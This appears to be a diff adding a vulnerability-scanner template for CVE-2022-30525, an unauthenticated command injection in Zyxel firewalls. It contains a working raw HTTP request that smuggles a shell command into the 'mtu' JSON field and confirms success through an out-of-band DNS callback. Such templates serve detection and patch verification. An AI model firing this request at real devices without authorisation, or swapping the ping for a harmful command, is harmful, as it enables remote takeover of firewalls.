@@ -1,0 +1,36 @@
+id: cve-2022-30525
+info:
+  name: Zyxel ZTP RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Several firewalls, such as the Zyxel ATP series, VPN series, and USG FLEX series, have security vulnerabilities. An unauthenticated remote attacker could execute arbitrary code on the affected device as the user nobody, taking control of the server.
+  classification:
+    cve-id: CVE-2022-30525
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    product: Zyxel
+    vul-type: command-execution
+    recommendation: |
+      At present, the manufacturer has released patches. Please refer to https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml
+
+http:
+  - raw:
+      - |
+        POST /ztp/cgi-bin/handler HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; ping {{interactsh-url}};","data":"hi"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: body
+        words:
+          - "success"
+    stop-at-first-match: true
